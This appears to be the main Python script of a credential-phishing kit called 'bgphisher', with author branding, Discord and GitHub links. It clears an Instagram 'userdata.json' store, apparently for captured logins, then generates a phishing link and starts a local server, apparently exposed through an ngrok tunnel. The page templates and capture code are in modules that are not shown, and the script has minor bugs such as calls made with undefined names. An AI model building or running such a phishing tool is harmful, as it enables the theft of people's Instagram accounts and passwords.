''' 
# Creator : MR.D3F417 > BLACK GUARD TM > WWW.blackberryy.ir 
# Discord : https://discord.gg/EZssbvh8UF
# Dont Copy Script Kids
# Zlink : zil.ink/mrd3f417
# GitHub : https://github.com/MRD3F417

  __  __ _____    _____ ____  ______ _  _  __ ______ 
 |  \/  |  __ \  |  __ \___ \|  ____| || |/_ |____  |
 | \  / | |__) | | |  | |__) | |__  | || |_| |   / / 
 | |\/| |  _  /  | |  | |__ <|  __| |__   _| |  / /  
 | |  | | | \ \ _| |__| |__) | |       | | | | / /   
 |_|  |_|_|  \_(_)_____/____/|_|       |_| |_|/_/


'''

import os, sys
from subprocess import Popen
from time import sleep
from menu import menu
from pyngrok import ngrok, conf
from modules import myClasses,server, linkgenerator
import json


#Create a module for needed libraries
def needs(module):
    module = str(module)
    os.system('clear')
    print(color.GREEN+"Please install% library\n pip3 install %s" %(module))
    sleep(0.3);sys.exit()

#Import needed Modules

try:
    from colorama import Fore as color
except:
    needs(colorama)

#####################
try:
    import requests
except:
    needs(requests)

#####################
try:
    from pyngrok import ngrok
except:
    needs(pyngrok)


        

#Let's Introduce my self to users
myClasses.Introduce()


create_file = open('websites/instagram/userdata.json','w')
empty_file = create_file.write('')
create_file.close()

stat_file = 0

bold = '\033[1m'
endbold = '\033[0m'

def social():
    os.system('clear')
#Respawn The Menu Here 
    menu.banner()
    sleep(0.1)
    menu.menu_respaws()
###############################
    try:
        option = input(color.RED+"\n[⚡] "+color.RED+"bgphisher"+color.LIGHTCYAN_EX+'/'+color.LIGHTWHITE_EX+"home"+color.LIGHTCYAN_EX+'/'+color.LIGHTRED_EX+" ⇒ " )
    except:
        print(color.RED+'Please Enter Your Platform...')
        sleep(1)
        sys.exit()
    
    if (option == '1'):
        os.system('clear')
        try:
            menu.banner()
            sleep(0.3)
            print(color.RED+"\n[⚡] "+color.RED+"bgphisher"+color.LIGHTCYAN_EX+'/'+color.LIGHTWHITE_EX+"home"+color.LIGHTCYAN_EX+'/'+color.LIGHTYELLOW_EX+'Instagram: \n' )
            linkgenerator.linkgenerator()
            server.server()
        except:
            print(color.RED+"[-] Something Went Wrong....")
            sleep(1)
            sys.exit()
    elif (option == '0'):
        print(color.WHITE+bold+"Thank's For Being Here. #mrd3f4117"+endbold)
        sleep(1)
        sys.exit()


social()